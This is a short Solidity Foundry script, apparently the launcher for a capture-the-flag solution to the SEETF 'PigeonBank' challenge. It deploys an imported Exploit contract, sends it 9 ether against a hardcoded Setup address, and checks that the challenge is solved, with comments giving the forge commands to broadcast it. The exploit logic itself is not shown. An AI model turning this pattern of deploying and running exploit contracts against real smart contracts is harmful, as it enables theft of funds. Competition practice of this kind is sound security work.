// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "./challenge/Setup.sol";
import "./Exploit.sol";

// forge script src/SEETF/PigeonBank/Exploit.s.sol:ExploitScript -vvvvv --private-key $PRIVATE_KEY --fork-url $RPC_URL
// forge script src/SEETF/PigeonBank/Exploit.s.sol:ExploitScript -vvvvv --private-key $PRIVATE_KEY --fork-url $RPC_URL --broadcast

contract ExploitScript is Script {
    function run() public {
        address setUpContractAddress = 0x3f47D6DFcBf0a264f5Bd711D31470CF2fB2fDe37;
        Setup setup = Setup(payable(setUpContractAddress));

        vm.startBroadcast();
        new Exploit().exploit{value: 9 ether}(address(setup));
        vm.stopBroadcast();

        assert(setup.isSolved());
    }
}
